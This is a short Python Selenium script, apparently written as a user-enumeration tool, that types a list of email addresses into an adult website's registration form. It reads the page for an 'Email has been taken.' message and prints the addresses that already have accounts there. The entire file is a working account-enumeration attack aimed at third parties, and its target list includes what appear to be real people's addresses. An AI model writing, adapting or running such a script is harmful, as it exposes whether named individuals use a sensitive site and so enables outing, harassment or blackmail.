#  User Enum redtube
# Very imp: Sleep needs to be present after sending username - send_keys(user) for redtube to work

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff

driver = webdriver.Edge(executable_path='msedgedriver')


print("The usernames present in redtube are:")

for i in ["batman@gmail.com","ccohen@aol.com", "koyex66140@tlhao86.com", "superman@gmail.com"]:

    user = i

    driver.get("https://www.redtube.com/register")
    p1 = driver.page_source
    #elem=driver.find_element_by_xpath("//input[@type='text']") #type = 'text'/'email'
    elem=driver.find_element_by_name("email")
    elem.send_keys(user)
    sleep(1)
    elem.send_keys(Keys.TAB)
    sleep(2)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2,p1)

    if "Email has been taken." in p3:
        print(i)
    sleep(2)
